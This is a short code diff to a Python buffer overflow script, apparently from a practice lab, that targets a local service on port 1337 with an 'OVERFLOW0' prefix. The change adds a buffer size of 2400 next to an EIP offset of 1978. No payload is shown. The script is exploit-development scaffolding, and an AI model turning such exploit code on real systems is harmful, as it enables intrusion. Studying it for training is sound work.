@@ -29,6 +29,9 @@ import buff
 
 runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")
 
+# Set Buffer Size
+runner.setBufferSize(2400)
+
 # Set Eip offset
 runner.setEipOffset(1978)
 
